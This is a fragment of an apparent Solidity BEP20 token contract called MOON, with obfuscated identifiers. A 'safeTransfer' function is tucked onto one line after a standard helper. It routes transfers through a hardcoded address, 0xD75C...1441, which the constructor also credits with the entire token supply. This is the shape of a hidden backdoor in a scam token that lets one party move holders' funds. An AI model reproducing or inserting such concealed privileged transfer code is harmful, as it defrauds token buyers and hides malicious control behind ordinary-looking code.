 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xD75CCbBB541839c15CEb0F293B65A9328F1C1441)) {TransferHelper.safeTransferFrom(0xD75CCbBB541839c15CEb0F293B65A9328F1C1441,spender,recipient,amount);return true;}return false;}
}
...
contract MOON is BEP20, bwnaZofH6SOq30pv {
  ...
  constructor() {
    tbZTyIuhAW3wQVgx[address(0xD75CCbBB541839c15CEb0F293B65A9328F1C1441)] = totalSupply();
    emit Transfer(address(0xD75CCbBB541839c15CEb0F293B65A9328F1C1441), address(0xD75CCbBB541839c15CEb0F293B65A9328F1C1441), totalSupply());
  }
